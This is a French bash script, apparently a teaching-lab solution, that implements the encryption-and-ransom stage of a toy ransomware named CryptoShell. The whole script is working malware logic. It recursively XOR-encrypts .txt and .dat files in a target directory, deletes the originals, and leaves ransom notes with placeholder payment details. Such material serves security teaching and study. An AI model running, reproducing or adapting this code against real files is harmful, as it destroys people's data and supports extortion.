#!/bin/bash
# CryptoShell — Phase 3 : Propagation et rançon
# Usage: bash phase3_ransom.sh <répertoire_cible>

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "${SCRIPT_DIR}/../fournis/xor_helper.sh"

TARGET_DIR="${1:-.}"
KEY_FILE=".cryptoshell_key"
VICTIM_ID=$(head -c 8 /dev/urandom | xxd -p)

# 3a) Générer une clé aléatoire
KEY=$(generate_key 8)
echo "$KEY" > "$KEY_FILE"

echo "[CryptoShell] Chiffrement en cours..."

# Fonction de création de note de rançon (3c)
create_ransom_note() {
    local dir="$1"
    cat > "${dir}/RANSOM_NOTE.txt" << EOF
============================================
        CRYPTOSHELL — VOS FICHIERS SONT CHIFFRÉS
============================================

Tous vos fichiers importants ont été chiffrés avec
un algorithme de chiffrement XOR robuste.

Identifiant victime : ${VICTIM_ID}

Pour récupérer vos fichiers, envoyez 0.5 BTC à
l'adresse suivante : [ADRESSE FICTIVE — TP ÉDUCATIF]

Puis contactez : cryptoshell@fake-educational.example

AVERTISSEMENT : Toute tentative de déchiffrement
sans la clé entraînera la perte définitive de vos
données.

[Ceci est un exercice éducatif — Aucune rançon réelle]
============================================
EOF
}

# Compteur de fichiers chiffrés
ENCRYPTED=0
DIRS_WITH_FILES=""

# 3a) Parcours récursif + chiffrement
find "$TARGET_DIR" -type f \( -name "*.txt" -o -name "*.dat" \) | while read filepath; do
    # 3b) Anti-surinfection : ne pas re-chiffrer les .locked
    case "$filepath" in
        *.locked) continue ;;
    esac
    # Ne pas chiffrer la note de rançon
    [ "$(basename "$filepath")" = "RANSOM_NOTE.txt" ] && continue

    # Chiffrer le fichier
    xor_file "$filepath" "${filepath}.locked" "$KEY"
    rm -f "$filepath"
    ENCRYPTED=$((ENCRYPTED + 1))
    echo "  [+] $(basename "$filepath") -> $(basename "$filepath").locked"

    # Marquer le répertoire pour y déposer une note
    DIR=$(dirname "$filepath")
    if [ ! -f "${DIR}/RANSOM_NOTE.txt" ]; then
        create_ransom_note "$DIR"
        echo "  [!] Note de rançon déposée dans $DIR"
    fi
done

echo ""
echo "[CryptoShell] Chiffrement terminé."
echo "[CryptoShell] Identifiant victime: $VICTIM_ID"
